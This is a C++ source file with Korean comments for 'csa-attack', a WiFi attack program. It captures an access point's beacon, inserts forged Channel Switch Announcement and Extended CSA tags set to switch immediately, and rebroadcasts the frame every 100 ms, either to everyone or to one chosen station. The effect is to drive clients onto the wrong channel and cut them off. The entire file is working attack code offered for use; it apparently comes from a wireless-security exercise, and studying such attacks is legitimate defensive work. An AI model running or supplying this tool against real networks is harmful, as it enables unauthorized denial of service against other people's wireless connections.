// =============================================================================
// csa-attack  : 802.11 (WiFi) Channel Switch Announcement(CSA) 공격 프로그램
// -----------------------------------------------------------------------------
// AP 가 보내는 정상 비콘을 캡처해, "곧 채널을 옮긴다" 는 가짜 알림(CSA + ECSA)
// 두 종류 태그를 끼워 넣어 다시 쏴 줌으로써 클라이언트가 엉뚱한 채널을
// 따라가게 만든다.
//
// 사용법 :
//   syntax : csa-attack <interface> <ap mac> [<station mac>]
//   sample : csa-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB
//
// 동작 모드 :
//   1) <ap mac> 만 주면       -> broadcast 모드 (DA=ff:ff:ff:ff:ff:ff)
//   2) <station mac> 까지 주면 -> unicast 모드   (DA=station)
//
// 흐름 :
//   1) libpcap 으로 모니터 인터페이스 열고, AP 의 비콘 1개 캡처
//   2) RadioTap 헤더를 분석해 끝에 FCS(4B) 가 붙어 있으면 잘라낸다
//   3) Tagged parameters 에 CSA(5B) 와 ECSA(6B) 태그 삽입 (switchCount=0, 즉시 전환)
//   4) unicast 모드면 DA(addr1) 를 station MAC 으로 교체
//   5) 짧은 간격(0.1초) 을 두고 반복 송신
//   6) 송신 실패가 한 번이라도 발생하면 즉시 루프 종료
// =============================================================================

#include <iostream>     // std::cout / std::cerr
#include <string>       // std::string
#include <vector>       // std::vector
#include <atomic>       // std::atomic
#include <csignal>      // std::signal
#include <stdexcept>    // std::invalid_argument

#include <unistd.h>     // usleep
#include <pcap.h>       // libpcap

#include "mac.h"
#include "dot11.h"
#include "frame.h"

// ============================================================
// Ctrl+C 안전 종료 처리
// ------------------------------------------------------------
//  - Ctrl+C 누르면 OS 가 SIGINT 신호 전송
//  - 신호 처리 함수 안에서는 복잡한 일은 위험 -> 깃발만 내림
//  - main 루프가 깃발을 보고 스스로 빠져나옴
// ============================================================
static std::atomic<bool> g_running(true);

// 신호 번호는 받지만 사용하지 않으므로 파라미터 이름을 비움
static void on_sigint(int) { g_running.store(false); }

// 사용법 출력
static void usage() {
    std::cout
        << "syntax : csa-attack <interface> <ap mac> [<station mac>]\n"
        << "sample : csa-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
}

// ============================================================
// capture_first_beacon(): BPF 필터로 AP 의 Beacon 1개 캡처
// ------------------------------------------------------------
//  성공 시 outBeacon 에 패킷 데이터 채우고 true,
//  실패 / Ctrl+C 면 false 반환.
// ============================================================
static bool capture_first_beacon(pcap_t* pcap,
                                 const Mac& apMac,
                                 std::vector<uint8_t>& outBeacon)
{
    // BPF 필터 : 관리 프레임 중 비콘이고, BSSID(addr3) 가 지정 AP 인 것만 통과
    std::string filter_exp = "type mgt subtype beacon and wlan addr3 " + apMac.toString();

    bpf_program fp;
    if (pcap_compile(pcap, &fp, filter_exp.data(), 1, PCAP_NETMASK_UNKNOWN) < 0) {
        std::cerr << "pcap_compile : " << pcap_geterr(pcap) << "\n";
        return false;
    }
    if (pcap_setfilter(pcap, &fp) < 0) {
        std::cerr << "pcap_setfilter : " << pcap_geterr(pcap) << "\n";
        pcap_freecode(&fp);
        return false;
    }
    pcap_freecode(&fp);

    std::cout << "[*] capturing beacon frame from " << apMac.toString()
              << " ... (Ctrl+C to abort)" << std::endl;

    while (g_running.load()) {
        pcap_pkthdr*   hdr = nullptr;
        const uint8_t* pkt = nullptr;
        int rc = pcap_next_ex(pcap, &hdr, &pkt);
        if (rc == 0)               continue;       // 타임아웃 -> 재시도
        if (rc == PCAP_ERROR_BREAK) return false;  // 강제 중단
        if (rc < 0) {
            std::cerr << "pcap_next_ex : " << pcap_geterr(pcap) << "\n";
            return false;
        }
        outBeacon.assign(pkt, pkt + hdr->caplen);
        return true;
    }
    return false; // Ctrl+C
}

// ============================================================
// main()
// ------------------------------------------------------------
//  argv[1] = 인터페이스 이름, argv[2] = AP MAC, argv[3] = (선택) Station MAC
// ============================================================
int main(int argc, char* argv[]) {

    if (argc < 3 || argc > 4) {
        usage();
        return 1;
    }

    const char* ifname    = argv[1];
    Mac         apMac;
    Mac         staMac;
    bool        hasStation = false;

    // AP MAC 파싱
    try {
        apMac = Mac(argv[2]);
    } catch (const std::invalid_argument&) {
        std::cerr << "AP MAC 주소 형식이 올바르지 않습니다: " << argv[2] << "\n";
        return 1;
    }

    // Station MAC 파싱 (있을 때만)
    if (argc == 4) {
        try {
            staMac = Mac(argv[3]);
        } catch (const std::invalid_argument&) {
            std::cerr << "Station MAC 주소 형식이 올바르지 않습니다: " << argv[3] << "\n";
            return 1;
        }
        hasStation = true;
    }

    // -- 1단계: pcap 핸들 오픈 --------------------------------
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(ifname, 65535, 1, 500, errbuf);
    if (!pcap) {
        std::cerr << "pcap_open_live : " << errbuf << "\n"
                  << "  -> root 권한과 monitor mode 인터페이스를 확인하세요.\n";
        return 1;
    }

    // 모니터 모드 (RadioTap) 인지 확인
    int dlt = pcap_datalink(pcap);
    if (dlt != DLT_IEEE802_11_RADIO) {
        std::cerr << "interface '" << ifname
                  << "' 는 monitor mode (radiotap) 가 아닙니다. "
                  << "current DLT = " << dlt << "\n";
        pcap_close(pcap);
        return 1;
    }

    // -- 2단계: Ctrl+C / SIGTERM 핸들러 등록 ------------------
    std::signal(SIGINT,  on_sigint);
    std::signal(SIGTERM, on_sigint);

    // 시작 정보 출력
    std::cout << "[*] interface : " << ifname           << "\n"
              << "[*] ap        : " << apMac.toString() << "\n";
    if (hasStation)
        std::cout << "[*] station   : " << staMac.toString() << "\n";
    std::cout << "[*] target    : "
              << (hasStation ? "AP unicast" : "AP broadcast")
              << "\n";

    // -- 3단계: Beacon 1개 캡처 -------------------------------
    std::vector<uint8_t> beaconBuf;
    if (!capture_first_beacon(pcap, apMac, beaconBuf)) {
        pcap_close(pcap);
        return 0; // 사용자 중단 / 에러 -> 정상 종료
    }
    std::cout << "[+] captured beacon : " << beaconBuf.size() << " bytes\n";

    // -- 4단계: CSA + ECSA 가 삽입된 공격 패킷 완성 -----------
    uint8_t outFrame[2048]; // Beacon + CSA(5B) + ECSA(6B) 여유 포함 충분
    size_t  outLen = build_csa_beacon(
        outFrame,
        sizeof(outFrame),
        beaconBuf.data(),
        beaconBuf.size(),
        hasStation,
        staMac
    );
    if (outLen == 0) {
        std::cerr << "CSA frame 생성 실패 (캡처된 프레임이 잘못되었거나 너무 큽니다)\n";
        pcap_close(pcap);
        return 1;
    }
    std::cout << "[+] built CSA/ECSA frame : " << outLen << " bytes\n"
              << "[*] starting CSA attack ... (Ctrl+C to stop)" << std::endl;

    // -- 5단계: 공격 패킷 반복 송신 ---------------------------
    //
    // 송신할 때마다 802.11 시퀀스 번호만 갱신한다.
    // switchCount 는 빌드 시점에 0(즉시 전환) 으로 박아 두었으므로
    // 매 송신마다 따로 손볼 필요가 없다.
    //
    // pcap_sendpacket 이 실패하면(=커널/드라이버 문제) 그 이상 의미 있는
    // 송신이 어려우므로 즉시 break 로 루프를 빠져나온다.

    // MAC 헤더는 RadioTap(8B) 다음에 위치 -> 그 위치를 구조체로 덮어쓰기
    dot11MacHdr* macHdr = reinterpret_cast<dot11MacHdr*>(outFrame + sizeof(dot11RadioTap));
    uint16_t     txSeq  = 0;        // 송신 시퀀스 번호 카운터 (0~4095 반복)

    unsigned long sent_ok = 0;       // 전송 성공 횟수

    while (g_running.load()) {
        // 802.11 seqCtrl : 상위 12비트 = 시퀀스 번호, 하위 4비트 = fragment 번호.
        // (txSeq << 4) 로 12비트 위로 밀면 fragment 자리에 자연스럽게 0 이 들어간다.
        // & 0x0FFF 로 12비트 범위(0~4095)에 가둔다.
        macHdr->seqCtrl = static_cast<uint16_t>((txSeq++ & 0x0FFF) << 4);

        // 송신 실패 시 즉시 루프 종료
        if (pcap_sendpacket(pcap, outFrame, static_cast<int>(outLen)) != 0) {
            std::cerr << "pcap_sendpacket : " << pcap_geterr(pcap) << "\n";
            break;
        }
        ++sent_ok;

        // 화면 도배 방지: 20번마다 1줄만 출력
        if (sent_ok % 20 == 0) {
            std::cout << "[+] CSA sent : ok=" << sent_ok
                      << " (" << outLen << " bytes)" << std::endl;
        }

        usleep(100 * 1000); // 100ms 대기 (단위: 마이크로초)
    }

    // 최종 결과 출력
    std::cout << "\n[*] stopping ... total ok=" << sent_ok << "\n";

    pcap_close(pcap);
    return 0;
}
